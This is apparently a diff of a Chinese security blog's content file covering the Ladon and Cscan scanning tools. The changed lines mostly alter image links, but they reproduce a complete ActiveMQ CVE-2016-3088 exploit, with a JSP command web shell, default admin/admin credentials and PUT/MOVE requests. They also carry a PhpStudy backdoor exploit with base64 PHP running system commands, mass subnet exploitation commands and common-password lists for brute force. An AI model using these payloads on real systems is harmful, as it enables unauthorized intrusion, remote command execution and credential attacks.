 <h3 id="INI参数说明"><a href="#INI参数说明" class="headerlink" title="INI参数说明"></a>INI参数说明</h3><p>exe:  程序名称，必填项。不指定路径优先加载SYSTEM32目录或当前目录下程序<br>arg:  程序参数，必填项。其中$ip$、$user$、$pass$变量为字典文件替换变量<br>isok：成功标志，必填项。如smbexec成功时返回”Launching semi-interactive shell”<br>port：对应端口，非必填。如SMB为445，Ladon先检测到端口开放，才进行密码爆破<br>log:  程序日志，非必填。如有些程序返回一堆错误结果，我们不想看，可不显示</p>
-<p>检测内网C段是否使用同一个密码,命令：Ladon 192.168.1.1/24 smbhash.ini<br>截图为6.1，大家记得把ret改成isok就行了。<br><img alt data-original="https://k8gege.org/k8img/Ladon/exe/DiyIniPwd.PNG"></p>
+<p>检测内网C段是否使用同一个密码,命令：Ladon 192.168.1.1/24 smbhash.ini<br>截图为6.1，大家记得把ret改成isok就行了。<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/DiyIniPwd.PNG"></p>
 <h3 id="功能多余？"><a href="#功能多余？" class="headerlink" title="功能多余？"></a>功能多余？</h3><p>有人可能会说，功能用不到，批量用自己的程序就可以了。<br>1.不是所有人都会编程，INI配置的目的主要是给这些人用的。<br>2.据我所知市面上的批量，仅支持批量单一列表，如IP列表、URL列表等，且不支持模块化。</p>
 <p>举个例子：CVE-2019-0708原版漏洞检测批量支持C段扫描，但不支持批量C段甚至批量B段扫描。<br>没错它是开源的，但有几个人去实现修改让它支持更多实战环境的批量需求？<br>C语言的多线程操作可和Python这种小学生都能轻松学会的人随便写的啊。<br>如果别的Poc，用其它你不懂的语言来写，你需要急用，你还会慢慢去学？<br>当然你不觉得麻烦，也可以另外用自己会的语言写个批量调用工具，哈哈</p>
 <h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
@@ -8016,11 +8016,11 @@ window.location.href="https://k8gege.org/Ladon/sshscan.html";
     <url>/p/12105.html</url>
     <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>使用Exp生成器生成Ladon插件实战，CVE-2016-3088 ActiveMQ GetShell</p>
 <h3 id="0x000-漏洞信息"><a href="#0x000-漏洞信息" class="headerlink" title="0x000 漏洞信息"></a>0x000 漏洞信息</h3><p>漏洞编号: CVE-2016-3088<br><br>漏洞原理: ActiveMQ 中的 FileServer 服务允许用户通过 PUT/MOVE方法上传文件到指定目录<br><br>影响版本: Apache ActiveMQ 5.0.0 – 5.13.2<br></p>
-<h3 id="0x001-获取路径"><a href="#0x001-获取路径" class="headerlink" title="0x001 获取路径"></a>0x001 获取路径</h3><p>PUT /fileserver/%20/%20<br><br><img alt data-original="https://k8gege.org/k8img/Cscan/expbuild/ActiveMQGetShell1.PNG"></p>
-<h3 id="0x002-上传shell"><a href="#0x002-上传shell" class="headerlink" title="0x002 上传shell"></a>0x002 上传shell</h3><p>上传和移动文件需登陆,默认帐密admin/admin,将以下代码双引号进行转义(原本是转义好的被github过滤了)<br><br>PUT<br><br>AddUrl: /fileserver/cmd.jsp<br><br>PUTData: &lt;%@ page import=&quot;java.io.*&quot;%&gt;&lt;%out.print(&quot;Hello&quot;);String strcmd = request.getParameter(&quot;cmd&quot;);String line =null;Process p=Runtime.getRuntime().exec(strcmd);InputStream is = p.getInputStream();BufferedReader br = new BufferedReader(new InputStreamReader(is));while((line =br.readLine())!=null){out.print(line+&quot;&quot;);}%&gt;<br><br>Authorization: admin:admin<br><br><img alt data-original="https://k8gege.org/k8img/Cscan/expbuild/ActiveMQGetShell2.PNG"></p>
-<h3 id="0x003-移动shell"><a href="#0x003-移动shell" class="headerlink" title="0x003 移动shell"></a>0x003 移动shell</h3><p>根目录和fileserver均不解析JSP文件,好在admin和api目录可以解析<br><br>MOVE<br><br>AddUrl: /fileserver/cmd.jsp<br><br>Destination: file://C:/Users/null/Desktop/apache-activemq-5.9.0/webapps/admin/cmd.jsp<br><br><img alt data-original="https://k8gege.org/k8img/Cscan/expbuild/ActiveMQGetShell3.PNG"></p>
-<h3 id="0x004-Cscan调用"><a href="#0x004-Cscan调用" class="headerlink" title="0x004 Cscan调用"></a>0x004 Cscan调用</h3><p><img alt data-original="https://k8gege.org/k8img/Cscan/expbuild/ActiveMQGetShell4.PNG"></p>
-<h3 id="0x005-连接shell"><a href="#0x005-连接shell" class="headerlink" title="0x005 连接shell"></a>0x005 连接shell</h3><p>访问<a href="http://192.168.1.26:8161/admin/shell.jsp?cmd=whoami" target="_blank" rel="noopener">http://192.168.1.26:8161/admin/shell.jsp?cmd=whoami</a><br><br><img alt data-original="https://k8gege.org/k8img/Cscan/expbuild/ActiveMQGetShell5.PNG"></p>
+<h3 id="0x001-获取路径"><a href="#0x001-获取路径" class="headerlink" title="0x001 获取路径"></a>0x001 获取路径</h3><p>PUT /fileserver/%20/%20<br><br><img alt="使用http访问查看图片" data-original="/k8img/Cscan/expbuild/ActiveMQGetShell1.PNG"></p>
+<h3 id="0x002-上传shell"><a href="#0x002-上传shell" class="headerlink" title="0x002 上传shell"></a>0x002 上传shell</h3><p>上传和移动文件需登陆,默认帐密admin/admin,将以下代码双引号进行转义(原本是转义好的被github过滤了)<br><br>PUT<br><br>AddUrl: /fileserver/cmd.jsp<br><br>PUTData: &lt;%@ page import=&quot;java.io.*&quot;%&gt;&lt;%out.print(&quot;Hello&quot;);String strcmd = request.getParameter(&quot;cmd&quot;);String line =null;Process p=Runtime.getRuntime().exec(strcmd);InputStream is = p.getInputStream();BufferedReader br = new BufferedReader(new InputStreamReader(is));while((line =br.readLine())!=null){out.print(line+&quot;&quot;);}%&gt;<br><br>Authorization: admin:admin<br><br><img alt="使用http访问查看图片" data-original="/k8img/Cscan/expbuild/ActiveMQGetShell2.PNG"></p>
+<h3 id="0x003-移动shell"><a href="#0x003-移动shell" class="headerlink" title="0x003 移动shell"></a>0x003 移动shell</h3><p>根目录和fileserver均不解析JSP文件,好在admin和api目录可以解析<br><br>MOVE<br><br>AddUrl: /fileserver/cmd.jsp<br><br>Destination: file://C:/Users/null/Desktop/apache-activemq-5.9.0/webapps/admin/cmd.jsp<br><br><img alt="使用http访问查看图片" data-original="/k8img/Cscan/expbuild/ActiveMQGetShell3.PNG"></p>
+<h3 id="0x004-Cscan调用"><a href="#0x004-Cscan调用" class="headerlink" title="0x004 Cscan调用"></a>0x004 Cscan调用</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Cscan/expbuild/ActiveMQGetShell4.PNG"></p>
+<h3 id="0x005-连接shell"><a href="#0x005-连接shell" class="headerlink" title="0x005 连接shell"></a>0x005 连接shell</h3><p>访问<a href="http://192.168.1.26:8161/admin/shell.jsp?cmd=whoami" target="_blank" rel="noopener">http://192.168.1.26:8161/admin/shell.jsp?cmd=whoami</a><br><br><img alt="使用http访问查看图片" data-original="/k8img/Cscan/expbuild/ActiveMQGetShell5.PNG"></p>
 <h3 id="0x006-视频教程"><a href="#0x006-视频教程" class="headerlink" title="0x006 视频教程"></a>0x006 视频教程</h3><p>Video1: <a href="https://github.com/k8gege/K8CScan/blob/master/Video/K8Cscan%20Apache%20ActiveMQ%20GetShell%20CVE-2016-3088.rar" target="_blank" rel="noopener">K8Cscan Apache ActiveMQ GetShell CVE-2016-3088</a><br><br>Video2: <a href="https://github.com/k8gege/K8CScan/blob/master/Video/K8Cscan%20WhatCMS%20GetShell.rar" target="_blank" rel="noopener">WhatCMS指纹识别内网ActiveMQ&amp;GetShell</a></p>
 ]]></content>
       <categories>
@@ -8095,12 +8095,12 @@ window.location.href="https://k8gege.org/Ladon/sshscan.html";
 <h3 id="0x001-测试POC"><a href="#0x001-测试POC" class="headerlink" title="0x001 测试POC"></a>0x001 测试POC<br></h3><p>打印字符串<br><br>echo “ISDoorOK”;<br><br>K8飞刀Base64编码得到 ZWNobyAiSVNEb29yT0siOw==<br><br>如包含 ISDoorOK ,返回PhpStudyDoor<br></p>
 <p>配置<br><br>Accept-Encoding: gzip,deflate<br><br>Accept-Charset: ZWNobyAiSVNEb29yT0siOw==<br></p>
 <p>PocTag: ISDoorOK<br><br>PocName: PhpStudyDoor<br></p>
-<p>编译测试<br><br>Cscan 5.2<br><br>By K8gege<br><br>load netscan.dll<br><br><a href="http://192.168.1.26" target="_blank" rel="noopener">http://192.168.1.26</a>     PhpStudyDoor<br><br>Finished!<br><br><img alt data-original="https://k8gege.org/k8img/Cscan/expbuild/PhpStudyPoc.PNG"></p>
+<p>编译测试<br><br>Cscan 5.2<br><br>By K8gege<br><br>load netscan.dll<br><br><a href="http://192.168.1.26" target="_blank" rel="noopener">http://192.168.1.26</a>     PhpStudyDoor<br><br>Finished!<br><br><img alt="使用http访问查看图片" data-original="/k8img/Cscan/expbuild/PhpStudyPoc.PNG"></p>
 <h3 id="0x002-利用EXP"><a href="#0x002-利用EXP" class="headerlink" title="0x002 利用EXP"></a>0x002 利用EXP</h3><p>执行whoami命令(可根据需要改成GetShell或反弹)<br><br>echo ‘start’;system(‘whoami’);echo ‘end’;<br></p>
 <p>配置<br><br>Accept-Encoding: gzip,deflate<br><br>Accept-Charset: ZWNobyAnc3RhcnQnO3N5c3RlbSgnd2hvYW1pJyk7ZWNobyAnZW5kJzs=<br></p>
-<p>编译测试<br><br>Cscan 5.2<br><br>By K8gege<br><br>load netscan.dll<br><br>startwin-4udh62v7dmn\null<br><br>endHello World<br><br>Finished!<br><br><img alt data-original="https://k8gege.org/k8img/Cscan/expbuild/PhpStudyTest.PNG"></p>
-<h3 id="0x003-结果提取"><a href="#0x003-结果提取" class="headerlink" title="0x003 结果提取"></a>0x003 结果提取</h3><p>Result勾选替换换行为空格<br><br>正则: (?&lt;=start).*?(?=end)<br><br><img alt data-original="https://k8gege.org/k8img/Cscan/expbuild/PhpStudyExp.PNG"></p>
-<h3 id="0x004-批量利用"><a href="#0x004-批量利用" class="headerlink" title="0x004 批量利用"></a>0x004 批量利用</h3><p>为了不被后续Exp覆盖,可将netscan.dll改名为PhpStudyExp.dll<br><br>单个IP检测 Cscan 192.168.1.8 PhpStudyExp.dll<br><br>单个URL检测Cscan <a href="http://192.168.1.8" target="_blank" rel="noopener">http://192.168.1.8</a> PhpStudyExp.dll<br><br>批量C段检测 Cscan 192.168.1.8/24 PhpStudyExp.dll<br><br>批量B段检测 Cscan 192.168.1.8/16 PhpStudyExp.dll<br><br>批量url.txt检测 Cscan PhpStudyExp.dll<br><br>执行结果返回机器IP以及利用结果(执行whoami当前用户)<br><br><img alt data-original="https://k8gege.org/k8img/Cscan/expbuild/PhpStudyCscan.png"></p>
+<p>编译测试<br><br>Cscan 5.2<br><br>By K8gege<br><br>load netscan.dll<br><br>startwin-4udh62v7dmn\null<br><br>endHello World<br><br>Finished!<br><br><img alt="使用http访问查看图片" data-original="/k8img/Cscan/expbuild/PhpStudyTest.PNG"></p>
+<h3 id="0x003-结果提取"><a href="#0x003-结果提取" class="headerlink" title="0x003 结果提取"></a>0x003 结果提取</h3><p>Result勾选替换换行为空格<br><br>正则: (?&lt;=start).*?(?=end)<br><br><img alt="使用http访问查看图片" data-original="/k8img/Cscan/expbuild/PhpStudyExp.PNG"></p>
+<h3 id="0x004-批量利用"><a href="#0x004-批量利用" class="headerlink" title="0x004 批量利用"></a>0x004 批量利用</h3><p>为了不被后续Exp覆盖,可将netscan.dll改名为PhpStudyExp.dll<br><br>单个IP检测 Cscan 192.168.1.8 PhpStudyExp.dll<br><br>单个URL检测Cscan <a href="http://192.168.1.8" target="_blank" rel="noopener">http://192.168.1.8</a> PhpStudyExp.dll<br><br>批量C段检测 Cscan 192.168.1.8/24 PhpStudyExp.dll<br><br>批量B段检测 Cscan 192.168.1.8/16 PhpStudyExp.dll<br><br>批量url.txt检测 Cscan PhpStudyExp.dll<br><br>执行结果返回机器IP以及利用结果(执行whoami当前用户)<br><br><img alt="使用http访问查看图片" data-original="/k8img/Cscan/expbuild/PhpStudyCscan.png"></p>
 <h3 id="0x005-下载"><a href="#0x005-下载" class="headerlink" title="0x005 下载"></a>0x005 下载</h3><p><a href="https://github.com/k8gege/K8CScan/tree/master/ExpGenerator" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/tree/master/ExpGenerator</a></p>
 ]]></content>
       <categories>
@@ -8160,7 +8160,7 @@ window.location.href="https://k8gege.org/Ladon/sshscan.html";
   <entry>
     <title>Ladon Scanner For PowerShell</title>
     <url>/p/673c210e.html</url>
-    <content><![CDATA[<p><img alt data-original="https://k8gege.org/k8img/Ladon/Dragon.jpg"></p>
+    <content><![CDATA[<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/Dragon.jpg"></p>
 <h3 id="程序简介"><a href="#程序简介" class="headerlink" title="程序简介"></a>程序简介</h3><p>Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。5.5版本内置39个功能模块,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息，漏洞检测包含MS17010、Weblogic、ActiveMQ、Tomcat、Struts2等，密码爆破11种含数据库(Mysql、Oracle、MSSQL)、FTP、SSH(Linux主机)、VNC、Windows密码(IPC、WMI、SMB)、Weblogic后台、Rar压缩包密码等，Web指纹识别模块可识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。<br></p>
 <h3 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h3><table>
 <thead>
@@ -8268,7 +8268,7 @@ window.location.href="https://k8gege.org/Ladon/sshscan.html";
 <p>据了解，SplashData公布的最差密码100强，是从密码管理服务SplashID、TeaMSID、Gpass收集得来。除了数字之外，还有“qwerty”、“password”等。</p>
 <p>观察前200名安全性最差的常用密码排行榜单，之所以很容易被窃取盗用，其共同特色就是很容易被猜到，烂密码可以归纳为5大类：使用简易数字组合（如12345）；键盘垂直或水平排列组合（如qwerty、1qaz2wsx）；体育相关单词；姓名相关和与食物相关的单词。</p>
 <p>看看你的密码在里面吗？</p>
-<h3 id="国外网民密码2011-2018"><a href="#国外网民密码2011-2018" class="headerlink" title="国外网民密码2011-2018"></a>国外网民密码2011-2018</h3><p><img alt data-original="https://k8gege.org/k8img/Other/top2011_2018.PNG"></p>
+<h3 id="国外网民密码2011-2018"><a href="#国外网民密码2011-2018" class="headerlink" title="国外网民密码2011-2018"></a>国外网民密码2011-2018</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Other/top2011_2018.PNG"></p>
 <h3 id="国外网民密码2019"><a href="#国外网民密码2019" class="headerlink" title="国外网民密码2019"></a>国外网民密码2019</h3><p>123456<br>12345679<br>qwerty<br>12345678<br>111111<br>1234567890<br>1234567<br>password<br>123123<br>987654321<br>qwertyuiop<br>mynoob<br>123321<br>666666<br>18atcskd2w<br>7777777<br>1q2w3e4r<br>654321<br>555555<br>3rjs1la7qe<br>google<br>1q2w3e4r5t<br>123qwe<br>zxcvbnm<br>1q2w3e</p>
 <h3 id="服务器SSH-VPS密码Top100"><a href="#服务器SSH-VPS密码Top100" class="headerlink" title="服务器SSH/VPS密码Top100"></a>服务器SSH/VPS密码Top100</h3><p>PublishThisListPlease<br>root<br>!@<br>wubao<br>password<br>123456<br>admin<br>12345<br>1234<br>p@ssw0rd<br>123<br>1<br>jiamima<br>test<br>root123<br>!<br>!q@w<br>!qaz@wsx<br>idc!@<br>admin!@</p>
 <p>alpine<br>qwerty<br>12345678<br>111111<br>123456789<br>1q2w3e4r<br>123123<br>default<br>1234567<br>qwe123<br>1qaz2wsx<br>1234567890<br>abcd1234<br>000000<br>user<br>toor<br>qwer1234<br>1q2w3e<br>asdf1234<br>redhat<br>1234qwer<br>cisco<br>12qwaszx<br>test123<br>1q2w3e4r5t<br>admin123<br>changeme<br>1qazxsw2<br>123qweasd<br>q1w2e3r4<br>letmein<br>server<br>root1234<br>master<br>abc123<br>rootroot<br>a<br>system<br>pass<br>1qaz2wsx3edc<br>p@$$w0rd<br>112233<br>welcome<br>!QAZ2wsx<br>linux<br>123321<br>manager<br>1qazXSW@<br>q1w2e3r4t5<br>oracle<br>asd123<br>admin123456<br>ubnt<br>123qwe<br>qazwsxedc<br>administrator<br>superuser<br>zaq12wsx<br>121212<br>654321<br>ubuntu<br>0000<br>zxcvbnm<br>root@123<br>1111<br>vmware<br>q1w2e3<br>qwerty123<br>cisco123<br>11111111<br>pa55w0rd<br>asdfgh<br>11111<br>123abc<br>asdf<br>centos<br>888888<br>54321<br>password123</p>
@@ -8493,30 +8493,30 @@ window.location.href="https://k8gege.org/Ladon/sshscan.html";
 </tr>
 </tbody></table>
 <h3 id="暂不支持功能"><a href="#暂不支持功能" class="headerlink" title="暂不支持功能"></a>暂不支持功能</h3><p>=============================================<br>Struts2Poc  X不支持<br>TomcatScan X不支持<br>HttpBasicScan X不支持，只能检测是否401认证URL，无法爆破<br>WeblogicPoc X 竟然不支持(Win下mono也不支持，显然mono问题)<br>MssqlScan X不支持只能扫到开放端口<br>IpcScan X不支持(因为调用cmd命令)</p>
-<h3 id="MS17010漏洞扫描"><a href="#MS17010漏洞扫描" class="headerlink" title="MS17010漏洞扫描"></a>MS17010漏洞扫描</h3><p><img alt data-original="https://k8gege.org/k8img/Ladon/kali/Kali_MS17010.gif"></p>
-<h3 id="PortScan端口扫描"><a href="#PortScan端口扫描" class="headerlink" title="PortScan端口扫描"></a>PortScan端口扫描</h3><p><img alt data-original="https://k8gege.org/k8img/Ladon/kali/Kali_PortScan.gif"></p>
-<h3 id="存活主机扫描"><a href="#存活主机扫描" class="headerlink" title="存活主机扫描"></a>存活主机扫描</h3><p><img alt data-original="https://k8gege.org/k8img/Ladon/kali/Kali_OnlinePC.gif"></p>
-<h3 id="存活主机IP扫描"><a href="#存活主机IP扫描" class="headerlink" title="存活主机IP扫描"></a>存活主机IP扫描</h3><p>可能IP需要用于其它用途，故提供只输出IP功能<br><img alt data-original="https://k8gege.org/k8img/Ladon/kali/Kali_OnlineIP.gif"></p>
-<h3 id="Ftp口令检测"><a href="#Ftp口令检测" class="headerlink" title="Ftp口令检测"></a>Ftp口令检测</h3><p><img alt data-original="https://k8gege.org/k8img/Ladon/kali/Kali_FtpScan.gif"></p>
-<h3 id="Smb口令检测"><a href="#Smb口令检测" class="headerlink" title="Smb口令检测"></a>Smb口令检测</h3><p><img alt data-original="https://k8gege.org/k8img/Ladon/kali/Kali_SmbScan.gif"></p>
-<h3 id="75种CMS识别"><a href="#75种CMS识别" class="headerlink" title="75种CMS识别"></a>75种CMS识别</h3><p><img alt data-original="https://k8gege.org/k8img/Ladon/kali/Kali_WhatCMS.gif"></p>
-<h3 id="子域名爆破"><a href="#子域名爆破" class="headerlink" title="子域名爆破"></a>子域名爆破</h3><p><img alt data-original="https://k8gege.org/k8img/Ladon/kali/Kali_SubDomain.gif"></p>
-<h3 id="系统版本探测"><a href="#系统版本探测" class="headerlink" title="系统版本探测"></a>系统版本探测</h3><p><img alt data-original="https://k8gege.org/k8img/Ladon/kali/Kali_OsScan.gif"></p>
-<h3 id="主机名解析IP"><a href="#主机名解析IP" class="headerlink" title="主机名解析IP"></a>主机名解析IP</h3><p><img alt data-original="https://k8gege.org/k8img/Ladon/kali/Kali_HostIP.gif"></p>
-<h3 id="子域名解析IP"><a href="#子域名解析IP" class="headerlink" title="子域名解析IP"></a>子域名解析IP</h3><p><img alt data-original="https://k8gege.org/k8img/Ladon/kali/Kali_DomainIP.gif"></p>
-<h3 id="SSH口令检测"><a href="#SSH口令检测" class="headerlink" title="SSH口令检测"></a>SSH口令检测</h3><p><img alt data-original="https://k8gege.org/k8img/Ladon/kali/Kali_SshScan.gif"></p>
-<h3 id="加载PowerShell插件"><a href="#加载PowerShell插件" class="headerlink" title="加载PowerShell插件"></a>加载PowerShell插件</h3><p><img alt data-original="https://k8gege.org/k8img/Ladon/kali/kali_ps1.PNG"></p>
-<h3 id="PhpStudy后门扫描"><a href="#PhpStudy后门扫描" class="headerlink" title="PhpStudy后门扫描"></a>PhpStudy后门扫描</h3><p><img alt data-original="https://k8gege.org/k8img/Ladon/kali/kali_PhpStudyPoc.gif"></p>
-<h3 id="URL域名扫描（不验IP）"><a href="#URL域名扫描（不验IP）" class="headerlink" title="URL域名扫描（不验IP）"></a>URL域名扫描（不验IP）</h3><p><img alt data-original="https://k8gege.org/k8img/Ladon/kali/kali_UrlScan.gif"></p>
-<h3 id="站点域名扫描（验证IP）"><a href="#站点域名扫描（验证IP）" class="headerlink" title="站点域名扫描（验证IP）"></a>站点域名扫描（验证IP）</h3><p><img alt data-original="https://k8gege.org/k8img/Ladon/kali/kali_SameWeb.gif"></p>
-<h3 id="Web信息扫描"><a href="#Web信息扫描" class="headerlink" title="Web信息扫描"></a>Web信息扫描</h3><p><img alt data-original="https://k8gege.org/k8img/Ladon/kali/kali_WebScan.gif"></p>
-<h3 id="Web目录扫描"><a href="#Web目录扫描" class="headerlink" title="Web目录扫描"></a>Web目录扫描</h3><p><img alt data-original="https://k8gege.org/k8img/Ladon/kali/kali_WebDir.gif"></p>
-<h3 id="Mysql口令检测"><a href="#Mysql口令检测" class="headerlink" title="Mysql口令检测"></a>Mysql口令检测</h3><p><img alt data-original="https://k8gege.org/k8img/Ladon/kali/kali_MysqlScan.gif"></p>
-<h3 id="Oracle口令检测"><a href="#Oracle口令检测" class="headerlink" title="Oracle口令检测"></a>Oracle口令检测</h3><p><img alt data-original="https://k8gege.org/k8img/Ladon/kali/kali_OracleScan.gif"></p>
-<h3 id="Vnc口令检测"><a href="#Vnc口令检测" class="headerlink" title="Vnc口令检测"></a>Vnc口令检测</h3><p><img alt data-original="https://k8gege.org/k8img/Ladon/kali/kali_VncScan.gif"></p>
-<h3 id="Http-Ftp下载"><a href="#Http-Ftp下载" class="headerlink" title="Http/Ftp下载"></a>Http/Ftp下载</h3><p><img alt data-original="https://k8gege.org/k8img/Ladon/kali/kali_Http_Ftp_Download.PNG"></p>
-<h3 id="Base64密码加解密"><a href="#Base64密码加解密" class="headerlink" title="Base64密码加解密"></a>Base64密码加解密</h3><p><img alt data-original="https://k8gege.org/k8img/Ladon/kali/Kali_Base64.gif"></p>
-<h3 id="Hex密码加解密"><a href="#Hex密码加解密" class="headerlink" title="Hex密码加解密"></a>Hex密码加解密</h3><p><img alt data-original="https://k8gege.org/k8img/Ladon/kali/Kali_Hex.gif"></p>
+<h3 id="MS17010漏洞扫描"><a href="#MS17010漏洞扫描" class="headerlink" title="MS17010漏洞扫描"></a>MS17010漏洞扫描</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/kali/Kali_MS17010.gif"></p>
+<h3 id="PortScan端口扫描"><a href="#PortScan端口扫描" class="headerlink" title="PortScan端口扫描"></a>PortScan端口扫描</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/kali/Kali_PortScan.gif"></p>
+<h3 id="存活主机扫描"><a href="#存活主机扫描" class="headerlink" title="存活主机扫描"></a>存活主机扫描</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/kali/Kali_OnlinePC.gif"></p>
+<h3 id="存活主机IP扫描"><a href="#存活主机IP扫描" class="headerlink" title="存活主机IP扫描"></a>存活主机IP扫描</h3><p>可能IP需要用于其它用途，故提供只输出IP功能<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/kali/Kali_OnlineIP.gif"></p>
+<h3 id="Ftp口令检测"><a href="#Ftp口令检测" class="headerlink" title="Ftp口令检测"></a>Ftp口令检测</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/kali/Kali_FtpScan.gif"></p>
+<h3 id="Smb口令检测"><a href="#Smb口令检测" class="headerlink" title="Smb口令检测"></a>Smb口令检测</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/kali/Kali_SmbScan.gif"></p>
+<h3 id="75种CMS识别"><a href="#75种CMS识别" class="headerlink" title="75种CMS识别"></a>75种CMS识别</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/kali/Kali_WhatCMS.gif"></p>
+<h3 id="子域名爆破"><a href="#子域名爆破" class="headerlink" title="子域名爆破"></a>子域名爆破</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/kali/Kali_SubDomain.gif"></p>
+<h3 id="系统版本探测"><a href="#系统版本探测" class="headerlink" title="系统版本探测"></a>系统版本探测</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/kali/Kali_OsScan.gif"></p>
+<h3 id="主机名解析IP"><a href="#主机名解析IP" class="headerlink" title="主机名解析IP"></a>主机名解析IP</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/kali/Kali_HostIP.gif"></p>
+<h3 id="子域名解析IP"><a href="#子域名解析IP" class="headerlink" title="子域名解析IP"></a>子域名解析IP</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/kali/Kali_DomainIP.gif"></p>
+<h3 id="SSH口令检测"><a href="#SSH口令检测" class="headerlink" title="SSH口令检测"></a>SSH口令检测</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/kali/Kali_SshScan.gif"></p>
+<h3 id="加载PowerShell插件"><a href="#加载PowerShell插件" class="headerlink" title="加载PowerShell插件"></a>加载PowerShell插件</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/kali/kali_ps1.PNG"></p>
+<h3 id="PhpStudy后门扫描"><a href="#PhpStudy后门扫描" class="headerlink" title="PhpStudy后门扫描"></a>PhpStudy后门扫描</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/kali/kali_PhpStudyPoc.gif"></p>
+<h3 id="URL域名扫描（不验IP）"><a href="#URL域名扫描（不验IP）" class="headerlink" title="URL域名扫描（不验IP）"></a>URL域名扫描（不验IP）</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/kali/kali_UrlScan.gif"></p>
+<h3 id="站点域名扫描（验证IP）"><a href="#站点域名扫描（验证IP）" class="headerlink" title="站点域名扫描（验证IP）"></a>站点域名扫描（验证IP）</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/kali/kali_SameWeb.gif"></p>
+<h3 id="Web信息扫描"><a href="#Web信息扫描" class="headerlink" title="Web信息扫描"></a>Web信息扫描</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/kali/kali_WebScan.gif"></p>
+<h3 id="Web目录扫描"><a href="#Web目录扫描" class="headerlink" title="Web目录扫描"></a>Web目录扫描</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/kali/kali_WebDir.gif"></p>
+<h3 id="Mysql口令检测"><a href="#Mysql口令检测" class="headerlink" title="Mysql口令检测"></a>Mysql口令检测</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/kali/kali_MysqlScan.gif"></p>
+<h3 id="Oracle口令检测"><a href="#Oracle口令检测" class="headerlink" title="Oracle口令检测"></a>Oracle口令检测</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/kali/kali_OracleScan.gif"></p>
+<h3 id="Vnc口令检测"><a href="#Vnc口令检测" class="headerlink" title="Vnc口令检测"></a>Vnc口令检测</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/kali/kali_VncScan.gif"></p>
+<h3 id="Http-Ftp下载"><a href="#Http-Ftp下载" class="headerlink" title="Http/Ftp下载"></a>Http/Ftp下载</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/kali/kali_Http_Ftp_Download.PNG"></p>
+<h3 id="Base64密码加解密"><a href="#Base64密码加解密" class="headerlink" title="Base64密码加解密"></a>Base64密码加解密</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/kali/Kali_Base64.gif"></p>
+<h3 id="Hex密码加解密"><a href="#Hex密码加解密" class="headerlink" title="Hex密码加解密"></a>Hex密码加解密</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/kali/Kali_Hex.gif"></p>
 <h3 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h3><table>
 <thead>
 <tr>
@@ -8665,9 +8665,9 @@ window.location.href="https://k8gege.org/Ladon/sshscan.html";
 
 <h3 id="Ladon执行PowerShell"><a href="#Ladon执行PowerShell" class="headerlink" title="Ladon执行PowerShell"></a>Ladon执行PowerShell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mono Ladon 123456 test.ps1</span><br></pre></td></tr></table></figure>
 
-<p>Kali 2019.4 x64<br><img alt data-original="https://k8gege.org/k8img/Ladon/kali/kali_ps1.PNG"></p>
-<p>Ubuntu 18.04 x64<br><img alt data-original="https://k8gege.org/k8img/Ladon/ubuntu/ub_ps1.PNG"></p>
-<h3 id="Windows绕过PowerShell限制"><a href="#Windows绕过PowerShell限制" class="headerlink" title="Windows绕过PowerShell限制"></a>Windows绕过PowerShell限制</h3><p>使用Ladon执行，就不存在PowerShell默认禁止执行脚本的限制<br><img alt data-original="https://k8gege.org/k8img/Ladon/exe/win_ps1.PNG"></p>
+<p>Kali 2019.4 x64<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/kali/kali_ps1.PNG"></p>
+<p>Ubuntu 18.04 x64<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/ubuntu/ub_ps1.PNG"></p>
